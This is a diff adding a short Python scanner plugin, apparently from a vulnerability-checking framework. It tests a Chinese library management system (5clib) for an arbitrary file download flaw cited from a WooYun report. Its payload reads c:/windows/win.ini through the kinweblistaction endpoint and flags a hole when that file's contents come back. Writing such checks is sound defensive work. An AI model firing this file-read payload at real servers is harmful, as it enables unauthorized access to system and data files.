@@ -1,0 +1,19 @@
+#!/usr/bin/evn python 
+#--coding:utf-8--*--
+#Name: 五车图书管系统任意下载
+#Refer:http://www.wooyun.org/bugs/wooyun-2015-0128591
+def assign(service, arg):
+    if service == "5clib":
+        return True, arg
+
+def audit(arg):
+    payload = arg + "5clib/kinweblistaction.action?actionName=down&filePath=c:/windows/win.ini"
+    code, head, res, errcode, _ = curl.curl2(payload)
+    if code ==200 and 'support' in res and 'MPEGVideo' in res:
+        security_hole(payload+':Any reading ' )
+
+
+if __name__ == '__main__':
+    from dummy import *
+    audit(assign('5clib','url')[1])
+ 
